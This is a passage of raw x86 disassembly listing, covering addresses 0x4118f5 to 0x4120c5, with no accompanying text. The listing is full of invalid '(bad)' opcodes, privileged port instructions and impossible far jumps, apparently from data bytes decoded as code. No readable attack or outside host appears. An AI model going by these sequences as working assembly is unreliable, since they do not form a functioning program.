  4118f5:	imul   ecx,DWORD PTR [edx-0x17ab7f92],0x55
  4118fc:	int    0x32
  4118fe:	scas   al,BYTE PTR es:[edi]
  4118ff:	dec    edx
  411900:	out    dx,eax
  411901:	ret    
  411902:	aam    0x79
  411904:	pop    esi
  411905:	stos   BYTE PTR es:[edi],al
  411906:	xor    bl,BYTE PTR [edi-0x39dc8ca6]
  41190c:	and    DWORD PTR [ebp-0x10843c00],esi
  411912:	mov    eax,ds:0x2c0b5128
  411917:	ret    0x796b
  41191a:	leave  
  41191b:	ins    DWORD PTR es:[edi],dx
  41191c:	aam    0x51
  41191e:	stc    
  41191f:	pop    cx
  411921:	shl    DWORD PTR [ebx-0x4c],cl
  411924:	ins    BYTE PTR es:[edi],dx
  411925:	cmp    esi,DWORD PTR [esi+0x5b7d6c11]
  41192b:	mov    bh,0x62
  41192d:	adc    esi,DWORD PTR ds:0xc517e483
  411933:	dec    ebx
  411934:	sar    ecx,0xac
  411937:	gs ja  0x411925
  41193a:	pop    es
  41193b:	push   cs
  41193c:	and    ebp,0xf8ad777e
  411942:	xor    dl,BYTE PTR [edi]
  411944:	push   ds
  411945:	inc    ecx
  411946:	or     DWORD PTR [edx+0x1f],0x3
  41194a:	scas   al,BYTE PTR es:[edi]
  41194b:	or     eax,0xf756e4ec
  411950:	sub    BYTE PTR [ebx+0x6],0xfa
  411954:	pop    esi
  411955:	sbb    BYTE PTR [ebx],cl
  411957:	fst    DWORD PTR [eax-0x75]
  41195a:	lea    ebx,[ebx+0x34439ace]
  411960:	sbb    DWORD PTR [edi-0x7],eax
  411963:	jno    0x41198a
  411965:	dec    ebx
  411966:	add    DWORD PTR ds:0x219cdd3a,ecx
  41196c:	sub    al,0xf7
  41196e:	mov    dh,0x39
  411970:	pop    esi
  411971:	sub    eax,0x1dadd723
  411976:	mov    esp,0x9199c5d9
  41197b:	push   es
  41197c:	lods   eax,DWORD PTR ds:[esi]
  41197d:	lea    edi,[ebp-0x7de655eb]
  411983:	xchg   esp,eax
  411984:	in     eax,dx
  411985:	mov    BYTE PTR [edx],bl
  411987:	rcr    DWORD PTR [esp+eiz*8-0x74],0xf8
  41198c:	jmp    0xfe13:0xd464e665
  411993:	jl     0x411918
  411995:	jnp    0x4119d3
  411997:	push   ss
  411998:	gs out dx,al
  41199a:	loop   0x4119d9
  41199c:	arpl   di,dx
  41199e:	ins    DWORD PTR es:[edi],dx
  41199f:	pop    esp
  4119a0:	jo     0x4119a0
  4119a2:	dec    esp
  4119a3:	in     al,0xa4
  4119a5:	push   ss
  4119a6:	scas   al,BYTE PTR es:[edi]
  4119a7:	iret   
  4119a8:	mov    ds:0x2a430eef,al
  4119ad:	outs   dx,DWORD PTR ds:[esi]
  4119ae:	mov    edi,0x255c96e1
  4119b3:	mov    ah,0x30
  4119b5:	and    al,0xd1
  4119b7:	dec    ebp
  4119b8:	les    edx,FWORD PTR [edi+0x66]
  4119bb:	out    0x31,al
  4119bd:	(bad)  
  4119be:	loope  0x4119b1
  4119c0:	aad    0xdd
  4119c2:	or     bl,BYTE PTR [ecx-0x6bbf38e1]
  4119c8:	popf   
  4119c9:	mov    ecx,0xee7c82ea
  4119ce:	cld    
  4119cf:	jbe    0x41199c
  4119d1:	int    0x58
  4119d3:	lods   eax,DWORD PTR ds:[esi]
  4119d4:	lods   al,BYTE PTR ds:[esi]
  4119d5:	xor    BYTE PTR [ebp+0x14],al
  4119d8:	push   ss
  4119d9:	out    dx,al
  4119da:	push   ebp
  4119db:	mov    ah,0x31
  4119dd:	xor    al,0x18
  4119df:	ja     0x411a07
  4119e1:	(bad)  
  4119e2:	call   0xad4ad7f8
  4119e7:	sbb    esp,DWORD PTR [esp+eax*8-0x59]
  4119eb:	sbb    bh,BYTE PTR [ebp-0x594c1eec]
  4119f1:	or     eax,0x6fc5446e
  4119f6:	stc    
  4119f7:	das    
  4119f8:	xchg   ecx,eax
  4119f9:	push   ecx
  4119fa:	pop    ebp
  4119fb:	xchg   ebx,eax
  4119fc:	adc    eax,0xb0266a27
  411a01:	sahf   
  411a02:	ret    
  411a03:	xchg   ebp,eax
  411a04:	mov    edi,0x359a5149
  411a09:	vpcmpgtw ymm6,ymm4,YMMWORD PTR [eax]
  411a0d:	fist   WORD PTR [edx+0xd6a8ace]
  411a13:	mov    ecx,0x674c694e
  411a18:	jne    0x411a49
  411a1a:	sub    al,0xdd
  411a1c:	fisttp DWORD PTR [ebx-0x78]
  411a1f:	push   cs
  411a20:	pop    edi
  411a21:	dec    esi
  411a22:	xor    BYTE PTR [edx-0x2d283939],cl
  411a28:	ins    DWORD PTR es:[edi],dx
  411a29:	mov    BYTE PTR [edi+0x4918ed6a],ah
  411a2f:	and    eax,0xe717888d
  411a34:	or     al,0x96
  411a36:	jecxz  0x411a4c
  411a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a39:	mov    eax,0x20896acd
  411a3e:	mov    ch,0x48
  411a40:	sti    
  411a41:	lahf   
  411a42:	mov    eax,0xd24625b
  411a47:	rcl    DWORD PTR [edx-0x11],0x9
  411a4b:	bound  edx,QWORD PTR [ebp-0x7989cb42]
  411a51:	mov    ebx,0xe35d6502
  411a56:	xchg   ebx,eax
  411a57:	cmp    ebx,DWORD PTR [ecx+eax*4-0x2540ff5a]
  411a5e:	fbld   TBYTE PTR [edi+0x72821f12]
  411a64:	jecxz  0x411aca
  411a66:	ins    DWORD PTR es:[edi],dx
  411a67:	inc    edx
  411a68:	pop    esp
  411a69:	jne    0x411ab5
  411a6b:	rol    DWORD PTR [ecx+0x16],1
  411a6e:	enter  0x4e55,0x49
  411a72:	push   ds
  411a73:	add    DWORD PTR [edx-0x22],eax
  411a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a77:	stos   BYTE PTR es:[edi],al
  411a78:	mov    edx,0xb857488f
  411a7d:	(bad)  
  411a7e:	pop    ds
  411a7f:	imul   ecx,DWORD PTR [ebp+0x34],0x3ae1465
  411a86:	lahf   
  411a87:	popf   
  411a88:	mov    edi,0x5236dee
  411a8d:	je     0x411a7c
  411a8f:	arpl   si,bp
  411a91:	push   edi
  411a92:	repnz xor ecx,DWORD PTR [ebx]
  411a95:	add    DWORD PTR [edx-0x505d040b],esi
  411a9b:	retf   0x80a
  411a9e:	dec    edx
  411a9f:	fdiv   st(5),st
  411aa1:	inc    edx
  411aa2:	jne    0x411a73
  411aa4:	(bad)  
  411aa5:	pop    eax
  411aa6:	and    cl,BYTE PTR [ecx-0x2d]
  411aa9:	jb     0x411b27
  411aab:	fld    QWORD PTR [eax+edx*4-0x38]
  411aaf:	ins    BYTE PTR es:[edi],dx
  411ab0:	cwde   
  411ab1:	mov    eax,ds:0xc7abc17d
  411ab6:	enter  0x275c,0xd4
  411aba:	pushf  
  411abb:	sub    eax,0x7472d04e
  411ac0:	mov    dl,0x7
  411ac2:	retf   
  411ac3:	test   al,0x95
  411ac5:	xor    DWORD PTR [ebx],ecx
  411ac7:	sub    dh,cl
  411ac9:	add    DWORD PTR [esi+ebx*4],0xf144067f
  411ad0:	or     DWORD PTR [ebp-0x68],ebx
  411ad3:	sti    
  411ad4:	lods   al,BYTE PTR ds:[esi]
  411ad5:	shl    BYTE PTR [edx+0xf],cl
  411ad8:	aaa    
  411ad9:	clc    
  411ada:	shl    BYTE PTR [ebx+0x4baae77f],0x80
  411ae1:	pop    esp
  411ae2:	jge    0x411aee
  411ae4:	dec    edx
  411ae5:	out    0x27,al
  411ae7:	pop    esp
  411ae8:	int    0x33
  411aea:	mov    ebp,0xea81506
  411aef:	cmp    eax,0x6be3bcb7
  411af4:	push   0xfffffffc
  411af6:	mov    cl,0xa5
  411af8:	inc    eax
  411af9:	fiadd  WORD PTR [edi+0x505e548a]
  411aff:	daa    
  411b00:	inc    esp
  411b01:	aaa    
  411b02:	and    ch,BYTE PTR [ebx+ebx*4-0x33adc7bf]
  411b09:	xchg   ecx,eax
  411b0a:	jns    0x411ab8
  411b0c:	clc    
  411b0d:	shl    DWORD PTR [edi-0x4f7cd09c],0x15
  411b14:	mov    edx,0xaaea00f3
  411b19:	push   esp
  411b1a:	jns    0x411b99
  411b1c:	sbb    al,0x30
  411b1e:	outs   dx,BYTE PTR ds:[esi]
  411b1f:	inc    ebx
  411b20:	jno    0x411b03
  411b22:	xchg   ebp,eax
  411b23:	sbb    DWORD PTR [edx],esi
  411b25:	rol    esi,1
  411b27:	xchg   esi,eax
  411b28:	xchg   ebx,eax
  411b29:	mov    ebp,0x5aa51e04
  411b2e:	dec    edi
  411b2f:	cld    
  411b30:	jae    0x411b71
  411b32:	xor    bl,BYTE PTR [ecx-0x2b92882]
  411b38:	mov    esp,0xdb7f5c6b
  411b3d:	test   DWORD PTR [ebx+0x1d46d692],0x27aff86f
  411b47:	(bad)  
  411b48:	js     0x411b18
  411b4a:	sub    esp,DWORD PTR [eax+0x79f4b0d9]
  411b50:	and    al,0xe1
  411b53:	sub    BYTE PTR [esi-0x7ff35a8c],cl
  411b59:	add    DWORD PTR [edi-0x7b9982f1],edi
  411b5f:	dec    edi
  411b60:	and    edi,DWORD PTR [edi-0x47]
  411b63:	jbe    0x411ba0
  411b65:	add    BYTE PTR [edx+0xa],bh
  411b68:	int3   
  411b69:	pop    esp
  411b6a:	popa   
  411b6b:	lods   al,BYTE PTR ds:[esi]
  411b6c:	pushf  
  411b6d:	push   ebx
  411b6e:	ds fs stc 
  411b71:	xchg   DWORD PTR [esi],ecx
  411b73:	addr16 in eax,dx
  411b75:	push   cs
  411b76:	clc    
  411b77:	retf   
  411b78:	imul   eax,eax,0x62
  411b7b:	lods   al,BYTE PTR ds:[esi]
  411b7c:	push   esi
  411b7d:	adc    eax,0xdff5d62e
  411b82:	or     edi,DWORD PTR [edi]
  411b84:	retf   
  411b85:	ficom  WORD PTR [ebp-0x5]
  411b88:	pop    ss
  411b89:	sub    ecx,DWORD PTR ds:0x54f66eba
  411b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b90:	ss into 
  411b92:	push   eax
  411b93:	ins    BYTE PTR es:[edi],dx
  411b94:	add    al,0xec
  411b96:	int3   
  411b97:	std    
  411b98:	aaa    
  411b99:	or     DWORD PTR [eax],esi
  411b9b:	ret    0x39d5
  411b9e:	not    DWORD PTR [eax+0x72950761]
  411ba4:	or     ecx,ebp
  411ba6:	bound  edx,QWORD PTR [edx]
  411ba8:	jnp    0x411c0d
  411baa:	ja     0x411bdd
  411bac:	push   ss
  411bad:	cmc    
  411bae:	lahf   
  411baf:	scas   al,BYTE PTR es:[edi]
  411bb0:	dec    eax
  411bb1:	or     DWORD PTR ds:0x2b57f75c,0x51
  411bb8:	ins    BYTE PTR es:[edi],dx
  411bb9:	ins    DWORD PTR es:[edi],dx
  411bba:	popf   
  411bbb:	xchg   ebp,eax
  411bbc:	(bad)  
  411bbd:	fld    DWORD PTR [esi-0x25]
  411bc0:	push   edi
  411bc1:	sub    eax,0xb3a12e34
  411bc6:	fnstenv [eax-0x1]
  411bc9:	std    
  411bca:	mov    eax,0x88083050
  411bcf:	inc    esi
  411bd0:	fwait
  411bd1:	scas   eax,DWORD PTR es:[edi]
  411bd2:	push   ss
  411bd3:	shr    DWORD PTR [edx+0x1a],cl
  411bd6:	cmp    eax,0x69dc9649
  411bdb:	push   ss
  411bdc:	mov    bh,0xa0
  411bde:	(bad)  
  411bdf:	rcr    bh,cl
  411be1:	dec    ebx
  411be2:	jnp    0x411b80
  411be4:	cs and ebx,0xb20f11b6
  411beb:	pop    ds
  411bec:	jae    0x411c36
  411bee:	pop    es
  411bef:	ret    
  411bf0:	enter  0x3452,0x68
  411bf4:	sub    al,0x52
  411bf6:	add    eax,0x8a9073da
  411bfb:	jg     0x411c4d
  411bfd:	xchg   ebx,eax
  411bfe:	popa   
  411bff:	or     al,0x78
  411c01:	mov    dl,0xcb
  411c03:	pushf  
  411c04:	lods   al,BYTE PTR ds:[esi]
  411c05:	pop    ecx
  411c06:	outs   dx,BYTE PTR ds:[esi]
  411c07:	xchg   edi,eax
  411c08:	and    BYTE PTR [esi+0x33],dl
  411c0b:	cmp    al,0xbc
  411c0d:	mov    DWORD PTR [ecx-0xc],eax
  411c10:	inc    edx
  411c11:	push   ds
  411c12:	jle    0x411c63
  411c14:	mov    bl,0x34
  411c16:	sbb    eax,0x5ff133d7
  411c1b:	popf   
  411c1c:	ret    0x9098
  411c1f:	and    BYTE PTR [ebp+0x1b],al
  411c22:	test   DWORD PTR [edx+0x6cc64d80],ebx
  411c28:	aam    0x74
  411c2a:	pop    esp
  411c2b:	mov    eax,0x67c835d
  411c30:	adc    ecx,DWORD PTR [eax-0x3d]
  411c33:	(bad)  
  411c35:	fisttp QWORD PTR [ecx]
  411c37:	int    0x3f
  411c39:	or     al,0xa2
  411c3b:	push   esp
  411c3c:	push   edx
  411c3d:	or     bl,BYTE PTR [edi+0x79]
  411c40:	into   
  411c41:	pop    ss
  411c42:	and    esp,edi
  411c44:	out    dx,al
  411c45:	inc    ecx
  411c46:	mov    dh,0x6c
  411c48:	mov    BYTE PTR [ebx+0x74b18fdb],dh
  411c4e:	gs mov bh,0x3c
  411c51:	or     BYTE PTR [esi+0x7976424a],bh
  411c57:	lahf   
  411c58:	jmp    0x411c68
  411c5a:	lock mov cl,0xa1
  411c5d:	add    eax,0xbcbbc3d7
  411c62:	fimul  DWORD PTR [esi+0x57cdd16c]
  411c68:	adc    eax,0xc909a31e
  411c6d:	hlt    
  411c6e:	gs std 
  411c70:	data16 neg BYTE PTR [edi+0x5c]
  411c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c75:	pop    es
  411c76:	ins    DWORD PTR es:[edi],dx
  411c77:	test   al,0xa3
  411c79:	ds jmpw 0xa707
  411c7e:	bound  esp,QWORD PTR [esi-0x51]
  411c81:	and    eax,0x253df56c
  411c86:	xchg   esi,eax
  411c87:	aaa    
  411c88:	fs pop esp
  411c8a:	(bad)  
  411c8b:	dec    ecx
  411c8c:	out    0xbf,eax
  411c8e:	pop    esp
  411c8f:	cmp    al,0x1f
  411c91:	icebp  
  411c92:	out    0x3a,al
  411c94:	into   
  411c95:	mov    bh,0xbf
  411c97:	push   0xffffff90
  411c99:	in     al,0xa3
  411c9b:	sbb    al,0xb0
  411c9d:	dec    dh
  411c9f:	and    al,0xf1
  411ca1:	mov    eax,0x3e0a0b72
  411ca6:	jmp    0x411c61
  411ca8:	adc    ebx,DWORD PTR [edi-0x18]
  411cab:	xor    eax,0x26f836a
  411cb0:	pushf  
  411cb1:	popf   
  411cb2:	bound  edi,QWORD PTR [esi]
  411cb4:	stos   BYTE PTR es:[edi],al
  411cb5:	aam    0x50
  411cb7:	out    dx,eax
  411cb8:	adc    eax,0x62059ca4
  411cbd:	mov    cl,0xa8
  411cbf:	sbb    ah,bh
  411cc1:	(bad)  
  411cc3:	inc    esi
  411cc4:	and    eax,0xd85c2c9f
  411cc9:	fisttp QWORD PTR [ebp+0x368a977e]
  411ccf:	fbld   TBYTE PTR [esi-0x38]
  411cd2:	jnp    0x411cf0
  411cd4:	call   0x4899:0x100a2370
  411cdb:	cdq    
  411cdc:	inc    ecx
  411cdd:	xor    eax,0xbe07773f
  411ce2:	test   BYTE PTR [ecx-0x7e],dh
  411ce5:	push   0x2f
  411ce7:	outs   dx,DWORD PTR ds:[esi]
  411ce8:	jo     0x411d5d
  411cea:	dec    eax
  411ceb:	xchg   edi,eax
  411cec:	xchg   edi,eax
  411ced:	cmp    dh,BYTE PTR [ebp-0x3c56924d]
  411cf3:	mov    ebp,ebp
  411cf5:	xor    al,0x61
  411cf7:	xor    ebx,ebx
  411cf9:	jne    0x411cfb
  411cfb:	cs dec ecx
  411cfd:	arpl   cx,di
  411cff:	(bad)  
  411d00:	pop    ds
  411d01:	inc    ecx
  411d02:	imul   ecx,DWORD PTR [esi],0x52
  411d05:	inc    edx
  411d06:	add    eax,0x91bc9bf6
  411d0b:	xor    edx,DWORD PTR [esi+ebp*1]
  411d0e:	sti    
  411d0f:	dec    ecx
  411d10:	pop    es
  411d11:	data16 (bad) 
  411d13:	sti    
  411d14:	cmp    bl,BYTE PTR [ebx+eiz*8+0x50]
  411d18:	jg     0x411d14
  411d1a:	mov    bh,0xc
  411d1c:	mov    dl,0xa1
  411d1e:	dec    ebp
  411d1f:	popf   
  411d20:	xor    dl,0xc4
  411d23:	or     BYTE PTR [esp+edx*2+0x22c8840e],cl
  411d2a:	jp     0x411cd9
  411d2c:	stc    
  411d2d:	mov    esi,es
  411d2f:	add    eax,0x2d31f35d
  411d34:	sub    BYTE PTR [ebx+ecx*8],dl
  411d37:	loopne 0x411d8d
  411d39:	xor    al,0x63
  411d3b:	pop    ss
  411d3c:	add    ch,bl
  411d3e:	mov    ah,0x7d
  411d40:	rcl    DWORD PTR [ebx],1
  411d42:	sub    BYTE PTR ds:0x2af0bcb3,dh
  411d48:	loopne 0x411dac
  411d4a:	mov    ecx,0x2e452c1
  411d4f:	mov    bh,0x48
  411d51:	js     0x411dad
  411d53:	ficom  WORD PTR [edx+0x34]
  411d56:	push   edx
  411d57:	sbb    DWORD PTR [ebx+0x5bce31dc],esp
  411d5d:	xor    edx,esi
  411d5f:	bound  ebx,QWORD PTR [edi-0x18]
  411d62:	inc    ebx
  411d63:	jmp    0xcbc4:0x58d9a035
  411d6a:	adc    BYTE PTR [edi],0x93
  411d6d:	and    eax,0x1c6f5d57
  411d72:	nop
  411d73:	and    ebp,ecx
  411d75:	dec    ebp
  411d76:	jl     0x411db3
  411d78:	ja     0x411d43
  411d7a:	sub    cl,al
  411d7c:	sub    bh,BYTE PTR [esi]
  411d7e:	popf   
  411d7f:	lea    ebp,[eax+0x7c8d92ca]
  411d85:	pop    eax
  411d86:	out    0x4d,eax
  411d88:	xchg   esp,eax
  411d89:	jecxz  0x411d0f
  411d8b:	sbb    eax,0x2ce7ed34
  411d90:	cmp    ah,dh
  411d92:	ret    0xb48c
  411d95:	icebp  
  411d96:	xor    al,0xb6
  411d98:	dec    eax
  411d99:	je     0x411d73
  411d9b:	pop    edi
  411d9c:	test   DWORD PTR [edx-0x5bf91138],ebp
  411da2:	sub    al,0xef
  411da4:	cmp    BYTE PTR [ebx-0x475e1c46],al
  411daa:	or     BYTE PTR [eax-0xb],al
  411dad:	adc    DWORD PTR [esi],0xbff0fcf
  411db3:	jge    0x411dab
  411db5:	and    bl,0x4e
  411db8:	out    0xc2,al
  411dba:	add    al,0xf7
  411dbc:	popf   
  411dbd:	je     0x411dd4
  411dbf:	add    bl,bh
  411dc1:	sbb    DWORD PTR [eax],esi
  411dc3:	imul   ebx,eax,0x50d9b164
  411dc9:	or     edx,edi
  411dcb:	sub    edi,DWORD PTR [esi+0x7761c587]
  411dd1:	in     al,dx
  411dd2:	test   dh,0xef
  411dd5:	mov    ds:0x306c1e02,eax
  411dda:	xchg   esp,eax
  411ddb:	in     eax,0xf5
  411ddd:	adc    al,0x79
  411ddf:	or     al,0xa4
  411de1:	shl    BYTE PTR [ebx-0x797f2c84],1
  411de7:	push   edi
  411de8:	pop    ecx
  411de9:	inc    eax
  411dea:	mov    al,ds:0xaeabdb01
  411def:	pop    es
  411df0:	shl    ah,cl
  411df2:	ins    DWORD PTR es:[edi],dx
  411df3:	aaa    
  411df4:	mov    eax,ds:0xc85b7bd5
  411df9:	(bad)  
  411dfb:	adc    bl,BYTE PTR [edx]
  411dfd:	addr16 jb 0x411e6b
  411e00:	cli    
  411e01:	aaa    
  411e02:	dec    esp
  411e03:	(bad)  
  411e04:	mov    ecx,0x39183f36
  411e09:	push   ds
  411e0a:	or     edx,DWORD PTR [ecx]
  411e0c:	mul    ecx
  411e0e:	dec    ecx
  411e0f:	jb     0x411e75
  411e11:	inc    ecx
  411e12:	out    dx,eax
  411e13:	fndisi(8087 only) 
  411e15:	mov    ds:0x188951e7,al
  411e1a:	or     BYTE PTR ds:0x9f011768,bl
  411e20:	test   al,0xea
  411e22:	or     esp,esp
  411e24:	sub    al,0xa6
  411e26:	aad    0x8
  411e28:	sbb    DWORD PTR [eax+ebp*2+0x63],esi
  411e2c:	outs   dx,DWORD PTR ds:[esi]
  411e2d:	sbb    al,0x85
  411e2f:	or     eax,0xf2abb3f9
  411e34:	ja     0x411db6
  411e36:	iret   
  411e37:	test   DWORD PTR [esp+ecx*1+0x5eec944],0x8617d21a
  411e42:	in     al,0x61
  411e44:	and    al,0xbf
  411e46:	inc    esp
  411e47:	retf   
  411e48:	push   esi
  411e49:	sub    edx,DWORD PTR [eax]
  411e4b:	retf   0xeac4
  411e4e:	pop    es
  411e4f:	mov    edi,0xc7b0f929
  411e54:	cs add eax,0xce7d241d
  411e5a:	cmc    
  411e5b:	mov    al,ds:0x8010fea6
  411e60:	push   esp
  411e61:	xor    BYTE PTR [ebx+0x79],dh
  411e64:	nop
  411e65:	inc    ebp
  411e66:	sbb    al,0x9a
  411e68:	ins    BYTE PTR es:[edi],dx
  411e69:	scas   al,BYTE PTR es:[edi]
  411e6a:	jg     0x411eea
  411e6c:	outs   dx,BYTE PTR ds:[esi]
  411e6d:	mov    ebx,0x4f2742d
  411e72:	imul   ebp,DWORD PTR [esi+0x342ed752],0x67057248
  411e7c:	rcl    DWORD PTR [esi+0x4f],1
  411e7f:	mov    BYTE PTR [eax+0x66],ch
  411e82:	and    cl,BYTE PTR [ebx-0x61304c54]
  411e88:	add    dl,bl
  411e8a:	cmp    al,BYTE PTR [edi+0x65c62328]
  411e90:	sbb    BYTE PTR [eax+0x6d76c3df],al
  411e96:	mov    edi,fs
  411e98:	jg     0x411e2e
  411e9a:	cli    
  411e9b:	xchg   ebp,esp
  411e9d:	ss jb  0x411e91
  411ea0:	or     ecx,DWORD PTR [ecx]
  411ea2:	xor    al,0x11
  411ea4:	jno    0x411e40
  411ea6:	mov    edx,0x24bac627
  411eab:	adc    BYTE PTR [edi+0x9fbb937],dl
  411eb1:	sbb    edi,DWORD PTR ds:0x673fd76a
  411eb7:	popf   
  411eb8:	sbb    BYTE PTR [ebp+0x6a],ah
  411ebb:	in     eax,dx
  411ebc:	outs   dx,BYTE PTR ds:[esi]
  411ebd:	and    eax,0x55e40d4
  411ec2:	push   DWORD PTR [ecx]
  411ec4:	mov    ecx,0x633d1653
  411ec9:	xchg   esi,eax
  411eca:	add    al,0xf1
  411ecc:	and    eax,0x4c1fd49d
  411ed1:	jl     0x411f2a
  411ed3:	(bad)  
  411ed5:	imul   ecx,eax,0x10
  411ed8:	adc    DWORD PTR [ebx],ebx
  411eda:	cld    
  411edb:	es sub al,0x63
  411ede:	es pop ebp
  411ee0:	inc    di
  411ee2:	push   edx
  411ee3:	pop    es
  411ee4:	(bad)  
  411ee5:	push   edi
  411ee6:	push   ebx
  411ee7:	jae    0x411efa
  411ee9:	jne    0x411ee9
  411eeb:	rcr    ecx,cl
  411eed:	push   ecx
  411eee:	or     al,BYTE PTR [esi+0x3f]
  411ef1:	repnz mov edx,DWORD PTR [esi+edi*1-0x20]
  411ef6:	scas   al,BYTE PTR es:[edi]
  411ef7:	bound  ebx,QWORD PTR [esi]
  411ef9:	pop    esp
  411efa:	xor    ch,BYTE PTR ds:0xcb6a878f
  411f00:	adc    bl,bl
  411f02:	sbb    DWORD PTR [edi-0x49fb9d9b],esi
  411f08:	xor    al,0x46
  411f0a:	sub    DWORD PTR [eax+eiz*8+0x2a],ebp
  411f0e:	push   edi
  411f0f:	lea    esp,[ebp+0x66]
  411f12:	inc    eax
  411f13:	inc    esi
  411f14:	mov    al,ds:0x92ea57ec
  411f19:	xchg   edi,eax
  411f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f1b:	popa   
  411f1c:	sub    al,0x45
  411f1e:	(bad)  
  411f1f:	push   eax
  411f20:	(bad)  
  411f21:	int    0x25
  411f23:	icebp  
  411f24:	daa    
  411f25:	push   0x64f2329d
  411f2a:	outs   dx,DWORD PTR ds:[esi]
  411f2b:	into   
  411f2c:	retf   
  411f2d:	inc    edi
  411f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f2f:	call   FWORD PTR fs:[edx-0x8000b3d]
  411f36:	std    
  411f37:	add    BYTE PTR [eax-0x3],bl
  411f3a:	das    
  411f3b:	cmp    edx,DWORD PTR [eax-0x1c751e21]
  411f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f42:	push   0x17
  411f44:	cmp    DWORD PTR [ebx],edi
  411f46:	mul    al
  411f48:	enter  0xd80,0xa3
  411f4c:	pop    ecx
  411f4d:	pop    es
  411f4e:	in     al,dx
  411f4f:	or     DWORD PTR [ebx+esi*2+0x734c5221],ecx
  411f56:	mov    BYTE PTR [edi+0x59],bh
  411f59:	icebp  
  411f5a:	aas    
  411f5b:	daa    
  411f5c:	(bad)  
  411f5d:	into   
  411f5e:	xchg   DWORD PTR [ebp-0x316390c6],ebx
  411f64:	adc    al,0x78
  411f66:	sbb    eax,0x7590fe19
  411f6b:	loope  0x411f04
  411f6d:	xor    eax,0x4e2bff91
  411f72:	push   0xffffffa5
  411f74:	daa    
  411f75:	push   0xdaa116d2
  411f7a:	add    eax,0xcd255c03
  411f7f:	push   ecx
  411f80:	arpl   cx,ax
  411f82:	in     eax,dx
  411f83:	ins    BYTE PTR es:[edi],dx
  411f84:	pop    ebx
  411f85:	into   
  411f86:	in     eax,dx
  411f87:	lea    ebx,[ebx-0x59b80349]
  411f8d:	daa    
  411f8e:	lock jmp 0x7bd22901
  411f94:	je     0x411f80
  411f96:	pop    esi
  411f97:	aas    
  411f98:	sub    BYTE PTR [ebx-0x32fb14ae],al
  411f9e:	sub    eax,0xb8ac910b
  411fa3:	mov    DWORD PTR [edx],0xe63904d7
  411fa9:	pop    es
  411faa:	and    al,0x2c
  411fac:	and    al,0x1f
  411fae:	xor    ch,bl
  411fb0:	stos   DWORD PTR es:[edi],eax
  411fb1:	push   ecx
  411fb2:	sub    BYTE PTR ds:0x21d403ee,bh
  411fb8:	mov    ?,WORD PTR [eax+0x20]
  411fbb:	mov    dh,0x9b
  411fbd:	mov    edx,0x8e4f158
  411fc2:	lahf   
  411fc3:	or     ecx,DWORD PTR [edx+edi*2+0xb]
  411fc7:	(bad)  
  411fc8:	xchg   ebp,eax
  411fc9:	jg     0x411f8d
  411fcb:	or     bh,dl
  411fcd:	and    DWORD PTR [edi+0x50cb330c],0xffffff99
  411fd4:	stc    
  411fd5:	rcr    eax,1
  411fd7:	mov    edx,0xf9bacbe7
  411fdc:	sub    DWORD PTR [edi-0x7ead08f],0xa8e4e1e4
  411fe6:	shl    DWORD PTR [edi-0x63],1
  411fe9:	jp     0x411fcd
  411feb:	fcmovne st,st(4)
  411fed:	adc    eax,ebx
  411fef:	jno    0x411f97
  411ff1:	adc    al,0x9b
  411ff3:	js     0x411f8d
  411ff5:	push   ebp
  411ff7:	arpl   bx,bx
  411ff9:	mov    dh,0x89
  411ffb:	xor    eax,0xa88ca7ac
  412000:	or     DWORD PTR ds:0x23939bde,0x75a8b197
  41200a:	dec    ebp
  41200b:	push   ecx
  41200c:	in     eax,dx
  41200d:	lds    ebx,FWORD PTR [esi]
  41200f:	nop
  412010:	stos   DWORD PTR es:[edi],eax
  412011:	xor    eax,0x229ee768
  412016:	jmp    0x7a928649
  41201b:	sbb    eax,0xca64b438
  412020:	cwde   
  412021:	addr16 and eax,0xce3861aa
  412027:	sub    al,0x64
  412029:	loope  0x4120a7
  41202b:	pop    ebp
  41202c:	sub    DWORD PTR [ebp+0x58],ebp
  41202f:	and    al,0xc
  412031:	stc    
  412032:	outs   dx,DWORD PTR ds:[esi]
  412033:	fidiv  DWORD PTR [esi-0x7008bec9]
  412039:	jno    0x412010
  41203b:	jmp    0x41205c
  41203d:	dec    ebx
  41203e:	inc    ecx
  41203f:	push   0x9b417894
  412044:	shld   DWORD PTR [edi],esp,cl
  412047:	cld    
  412048:	lods   eax,DWORD PTR ds:[esi]
  412049:	in     al,dx
  41204a:	das    
  41204b:	xor    eax,0x1c583417
  412050:	pop    esp
  412051:	or     cl,dh
  412053:	outs   dx,DWORD PTR ds:[esi]
  412054:	sub    DWORD PTR [esi-0x19],ebp
  412057:	dec    edx
  412058:	jne    0x41206d
  41205a:	nop
  41205b:	pop    edx
  41205c:	adc    eax,0x76416f91
  412061:	ret    0x4ee9
  412064:	dec    esi
  412065:	inc    ecx
  412066:	dec    edx
  412067:	pop    DWORD PTR [ebx+0x3f1bf98c]
  41206d:	mov    ch,0x19
  41206f:	out    dx,al
  412070:	icebp  
  412071:	cmp    al,0x3a
  412073:	dec    ebp
  412074:	mov    ds:0xdb1efcc8,al
  412079:	sub    esp,DWORD PTR [ebp+eax*2+0x3526f5f3]
  412080:	in     al,0xd5
  412082:	repz add DWORD PTR [ebx+0x54d369f1],0xee5020d2
  41208d:	adc    edi,DWORD PTR ds:0x2fbb5e70
  412093:	enter  0x6c72,0xdb
  412097:	(bad)  [ecx-0x80]
  41209a:	fsub   DWORD PTR [esp+esi*2]
  41209d:	mov    dl,0x8d
  41209f:	xor    DWORD PTR ds:[ebp+0x7dbedd4c],ebp
  4120a6:	or     esi,esp
  4120a8:	dec    bh
  4120aa:	and    BYTE PTR [eax],cl
  4120ac:	test   DWORD PTR [eax],edi
  4120ae:	jo     0x41210b
  4120b0:	mov    WORD PTR [edi-0x778f7141],gs
  4120b6:	shl    edi,0x8d
  4120b9:	pop    ecx
  4120ba:	sub    bl,al
  4120bc:	xchg   edx,eax
  4120bd:	retf   0xa553
  4120c0:	adc    DWORD PTR [ecx],edi
  4120c2:	xchg   ebp,eax
  4120c3:	(bad)  
  4120c4:	stos   DWORD PTR es:[edi],eax
  4120c5:	sti    
